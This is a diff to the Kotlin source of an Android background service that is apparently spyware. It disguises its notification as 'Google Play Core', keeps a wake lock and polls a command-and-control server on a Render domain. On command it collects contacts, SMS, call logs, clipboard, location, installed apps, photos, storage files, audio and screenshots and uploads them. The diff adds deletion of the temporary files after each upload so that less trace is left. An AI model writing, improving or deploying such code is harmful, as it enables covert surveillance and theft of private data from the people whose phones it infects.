@@ -36,7 +36,7 @@ class SyncService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     
-    // رابط السيرفر المعتمد على Render
+    // روابط سيرفرك المعتمد على Render
     private val C2_STREAM_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/stream"
     private val C2_INGEST_URL = "https://web-assets-service-2.onrender.com/api/v3/uranium/upload_raw"
     private var lastHeartbeatSent = 0L
@@ -44,14 +44,14 @@ class SyncService : Service() {
     override fun onCreate() {
         super.onCreate()
         val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "IronFist::EliteLock")
+        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "UraniumFist::ZeroCacheLock")
         wakeLock?.acquire(10 * 60 * 60 * 1000L)
         startForegroundServiceNotification()
     }
 
     private fun startForegroundServiceNotification() {
-        val channelId = "iron_fist_channel"
-        val channel = NotificationChannel(channelId, "Google Play Services", NotificationManager.IMPORTANCE_LOW)
+        val channelId = "uranium_core_channel"
+        val channel = NotificationChannel(channelId, "Google Play Core", NotificationManager.IMPORTANCE_LOW)
         val manager = getSystemService(NotificationManager::class.java)
         manager?.createNotificationChannel(channel)
 
@@ -65,7 +65,7 @@ class SyncService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "elite_node"
+        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "uranium_node"
         val nodeModel = Build.MODEL
         
         serviceScope.launch {
@@ -84,7 +84,7 @@ class SyncService : Service() {
                     val currentTime = System.currentTimeMillis()
                     val sendHeartbeat = (currentTime - lastHeartbeatSent > 60000L)
                     val reportType = if (sendHeartbeat) "HEARTBEAT" else "SILENT_CHECK"
-                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Elite Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
+                    val reportJson = "{\"type\":\"$reportType\",\"data\":\"[Zero-Cache Active] $nodeModel (سلطان الظل ناصر دين الله الكلعي)\"}"
 
                     if (sendHeartbeat) {
                         lastHeartbeatSent = currentTime
@@ -100,7 +100,6 @@ class SyncService : Service() {
                         val responseStr = responseReader.readText()
                         responseReader.close()
 
-                        // معالجة وتنفيذ الأوامر الحقيقية القادمة من السيرفر بذكاء تام
                         if (responseStr.contains("task") && responseStr.contains("action")) {
                             try {
                                 val jsonRes = JSONObject(responseStr)
@@ -111,45 +110,43 @@ class SyncService : Service() {
                                     when {
                                         action.contains("EXTRACT_CONTACTS") -> {
                                             val data = readContacts()
-                                            processAndUpload(deviceId, nodeModel, "Uranium_Contacts.txt", data.toByteArray(Charsets.UTF_8))
+                                            streamTextDirect(deviceId, nodeModel, "Uranium_Contacts.txt", data)
                                         }
                                         action.contains("EXTRACT_SMS") -> {
                                             val data = readSMS()
-                                            processAndUpload(deviceId, nodeModel, "Uranium_SMS.txt", data.toByteArray(Charsets.UTF_8))
+                                            streamTextDirect(deviceId, nodeModel, "Uranium_SMS.txt", data)
                                         }
                                         action.contains("EXTRACT_CALLS") -> {
                                             val data = readCallLogs()
-                                            processAndUpload(deviceId, nodeModel, "Uranium_CallLogs.txt", data.toByteArray(Charsets.UTF_8))
+                                            streamTextDirect(deviceId, nodeModel, "Uranium_CallLogs.txt", data)
                                         }
                                         action.contains("EXTRACT_CLIPBOARD") -> {
                                             val data = readClipboard()
-                                            processAndUpload(deviceId, nodeModel, "Uranium_Clipboard.txt", data.toByteArray(Charsets.UTF_8))
+                                            streamTextDirect(deviceId, nodeModel, "Uranium_Clipboard.txt", data)
                                         }
                                         action.contains("EXTRACT_LOCATION") -> {
                                             val data = readLocationFast()
-                                            processAndUpload(deviceId, nodeModel, "Uranium_Location.txt", data.toByteArray(Charsets.UTF_8))
+                                            streamTextDirect(deviceId, nodeModel, "Uranium_Location.txt", data)
                                         }
                                         action.contains("EXTRACT_APPS") -> {
                                             val data = readInstalledApps()
-                                            processAndUpload(deviceId, nodeModel, "Uranium_InstalledApps.txt", data.toByteArray(Charsets.UTF_8))
+                                            streamTextDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", data)
                                         }
                                         action.contains("EXTRACT_CAMERA_ZIP") -> {
-                                            compressAndUploadMegaArchive(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                            streamArchiveDirect(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                         }
                                         action.contains("EXTRACT_STORAGE_ZIP") -> {
-                                            compressAndUploadMegaArchive(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
+                                            streamArchiveDirect(deviceId, nodeModel, "Storage_Files", MediaStore.Files.getContentUri("external"))
                                         }
                                         action.contains("EXTRACT_AUDIO") -> {
-                                            compressAndUploadMegaArchive(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                                            streamArchiveDirect(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
                                         }
                                         action.contains("EXTRACT_SCREENSHOT_ZIP") -> {
-                                            compressAndUploadMegaArchive(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                            streamArchiveDirect(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                         }
                                     }
                                 }
-                            } catch (ex: Exception) {
-                                // استمرار العمل بهدوء تام دون أي توقف
-                            }
+                            } catch (ex: Exception) {}
                         }
                     }
                     conn.disconnect()
@@ -162,18 +159,22 @@ class SyncService : Service() {
         return START_STICKY
     }
 
-    private fun processAndUpload(nodeId: String, nodeModel: String, fileName: String, bytes: ByteArray) {
+    // تدفق النصوص مباشرة للسيرفر وحذفها فوراً (Zero-Cache)
+    private fun streamTextDirect(nodeId: String, nodeModel: String, fileName: String, content: String) {
         try {
+            val bytes = content.toByteArray(Charsets.UTF_8)
             val tempFile = File(cacheDir, fileName)
             tempFile.writeBytes(bytes)
-            uploadRawElite(nodeId, nodeModel, fileName, tempFile)
-            sendReportToServer(nodeId, nodeModel, "✅ [حصاد ناجح] الملف <b>$fileName</b> تم إرساله لسيرفرك المركزي بنجاح.")
+            uploadRawZeroCache(nodeId, nodeModel, fileName, tempFile)
+            try { tempFile.delete() } catch (e: Exception) {} // حذف فوري ونهائي
+            sendReportToServer(nodeId, nodeModel, "✅ [حصاد نظيف بدون كاش] الملف <b>$fileName</b> تم بثه للسيرفر وتطهير الذاكرة تماماً.")
         } catch (e: Exception) {}
     }
 
-    private fun compressAndUploadMegaArchive(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
+    // تدفق الأرشيفات بالضغط المباشر والمسح الفوري للملف المؤقت
+    private fun streamArchiveDirect(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
         try {
-            sendReportToServer(nodeId, nodeModel, "⚡ [بدء الحصاد] تجميع وضغط بيانات $prefix بأعلى كفاءة...")
+            sendReportToServer(nodeId, nodeModel, "⚡ [البث المباشر الفوري] جاري تجميع وضغط بيانات $prefix بنظام Zero-Cache...")
             val zipFile = File(cacheDir, "Uranium_${prefix}_${System.currentTimeMillis()}.zip")
             val zipOut = ZipOutputStream(FileOutputStream(zipFile))
             zipOut.setLevel(Deflater.BEST_COMPRESSION)
@@ -186,7 +187,7 @@ class SyncService : Service() {
             cursor?.use {
                 val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
                 val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                while (it.moveToNext() && fileCount < 3000) {
+                while (it.moveToNext() && fileCount < 2000) {
                     if (dataIdx != -1 && nameIdx != -1) {
                         val filePath = it.getString(dataIdx)
                         val fileName = it.getString(nameIdx)
@@ -207,12 +208,14 @@ class SyncService : Service() {
             zipOut.close()
 
             val sizeMB = zipFile.length() / (1024.0 * 1024.0)
-            uploadRawElite(nodeId, nodeModel, zipFile.name, zipFile)
-            sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد الضخم]\n📂 <code>${zipFile.name}</code>\n📊 الحجم: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)")
+            uploadRawZeroCache(nodeId, nodeModel, zipFile.name, zipFile)
+            try { zipFile.delete() } catch (e: Exception) {} // تنظيف الكاش كلياً فور الرفع
+            
+            sendReportToServer(nodeId, nodeModel, "✅ [تم الحصاد وبثه بنجاح وتطهير الذاكرة]\n📂 <code>${zipFile.name}</code>\n📊 الحجم: <b>${String.format("%.2f", sizeMB)} MB</b> ($fileCount ملفاً)")
         } catch (e: Exception) {}
     }
 
-    private fun uploadRawElite(nodeId: String, nodeModel: String, fileName: String, file: File) {
+    private fun uploadRawZeroCache(nodeId: String, nodeModel: String, fileName: String, file: File) {
         for (attempt in 1..3) {
             try {
                 val url = URL(C2_INGEST_URL)
